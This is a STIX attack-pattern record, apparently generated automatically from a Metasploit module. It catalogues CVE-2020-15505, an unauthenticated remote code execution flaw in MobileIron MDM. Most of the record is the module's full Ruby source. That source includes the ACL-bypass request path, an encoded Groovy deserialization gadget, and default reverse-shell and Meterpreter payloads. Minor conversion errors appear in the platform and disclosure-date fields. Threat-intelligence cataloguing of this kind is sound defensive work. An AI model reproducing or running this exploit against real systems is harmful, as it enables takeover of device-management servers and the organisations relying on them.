{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7e2bdcc6-8126-4fec-839f-0793ca65b8fa",
    "created": "2024-08-14T17:00:55.229265Z",
    "modified": "2024-08-14T17:00:55.229269Z",
    "name": "MobileIron MDM Hessian-Based Java Deserialization RCE",
    "description": " This module exploits an ACL bypass in MobileIron MDM products to execute a Groovy gadget against a Hessian-based Java deserialization endpoint. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/mobileiron_mdm_hessian_rce.rb",
            "external_id": "mobileiron_mdm_hessian_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-15505"
        },
        {
            "source_name": "reference",
            "url": "https://www.mobileiron.com/en/blog/mobileiron-security-updates-available"
        },
        {
            "source_name": "reference",
            "url": "https://blog.orange.tw/2020/09/how-i-hacked-facebook-again-mobileiron-mdm-rce.html"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/httpvoid/CVE-Reverse/tree/master/CVE-2020-15505"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'MobileIron MDM Hessian-Based Java Deserialization RCE',\n        'Description' => %q{\n          This module exploits an ACL bypass in MobileIron MDM products to\n          execute a Groovy gadget against a Hessian-based Java deserialization\n          endpoint.\n        },\n        'Author' => [\n          'Orange Tsai', # Discovery\n          'rootxharsh', # Exploit\n          'iamnoooob', # Exploit\n          'wvu' # Module\n        ],\n        'References' => [\n          ['CVE', '2020-15505'],\n          ['URL', 'https://www.mobileiron.com/en/blog/mobileiron-security-updates-available'],\n          ['URL', 'https://blog.orange.tw/2020/09/how-i-hacked-facebook-again-mobileiron-mdm-rce.html'],\n          ['URL', 'https://github.com/httpvoid/CVE-Reverse/tree/master/CVE-2020-15505']\n        ],\n        'DisclosureDate' => '2020-09-12', # Public disclosure\n        'License' => MSF_LICENSE,\n        'Platform' => ['unix', 'linux'],\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Privileged' => false,\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_python_ssl'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :linux_dropper,\n              'DefaultOptions' => {\n                'CMDSTAGER::FLAVOR' => :bourne,\n                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'SSL' => true\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options([\n      Opt::RPORT(443),\n      OptString.new('TARGETURI', [true, 'Base path', '/'])\n    ])\n  end\n\n  def check\n    # http://hessian.caucho.com/doc/hessian-1.0-spec.xtp#Call\n    res = send_request_hessian('c')\n\n    unless res\n      return CheckCode::Unknown('Target did not respond to check.')\n    end\n\n    unless res.code == 200 && res.headers['Content-Type'] == 'application/x-hessian'\n      return CheckCode::Safe('ACL bypass failed.')\n    end\n\n    CheckCode::Vulnerable('ACL bypass successful.')\n  end\n\n  def exploit\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n\n    case target['Type']\n    when :unix_cmd\n      execute_command(payload.encoded)\n    when :linux_dropper\n      execute_cmdstager\n    end\n  end\n\n  def execute_command(cmd, _opts = {})\n    vprint_status(\"Executing command: #{cmd}\")\n\n    send_request_hessian(groovy_gadget(cmd))\n  end\n\n  def send_request_hessian(data)\n    send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/mifs/.;/services/LogService'),\n      'ctype' => 'x-application/hessian',\n      'headers' => {\n        'Referer' => rand_text_english(8..42)\n      },\n      'data' => data\n    )\n  end\n\n  def groovy_gadget(cmd)\n    # http://hessian.caucho.com/doc/hessian-1.0-spec.xtp#Headers\n    hessian = \"c\\x01\\x00H\\x00\\x08#{rand_text_english(8)}\"\n\n    # Cale hates me for this\n    hessian << Rex::Text.zlib_inflate(Rex::Text.decode_base64(\n      <<~HESSIAN\n        eNpFj01PwkAQhkcRBUz8CBe9cfVg+Q3YYDBKIS7h4mnbju2S3W4zuy20v95BQS6bfXffPPPM\n        3APMPQwzsrZugsorHUx3pSxSK+Ae/25LsiWSV+i4CgJ6uXR5aFPk+GQpCxK+57JywQFDVeGV\n        wWCOPrdpqK2rCAVcmt8soOu8JC/gltBZXaPwJD1mzRvAnt9PFWHiVY2Hh0cjd8pUJqpMjLT4\n        XkqSzEJyh0IvRY0ZM9joYSNrGWhZZAGLJ+jcS6V0iiRgSPiHnhJZ4qkozauAq8Qaw4uuNcM6\n        nMexKsYuF3D+nLDlbBK+j1az6Wj5MYmmq/bf0FITCbjGolZkC4OF59g/DnERN7t2WyB9MvhC\n        wMDnyi3iDX9y8aY8rrFqSnRrD3dfJ/dQS+f2QsCUTpxso7Zt95yz09EOfgCmKo1k\n      HESSIAN\n    ))\n\n    hessian.sub(\"\\x00\\x0fHACK THE PLANET\", \"#{[cmd.length].pack('n')}#{cmd}\")\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2020-09-12, # Public disclosure",
    "x_mitre_platforms": [
        "linux'"
    ]
}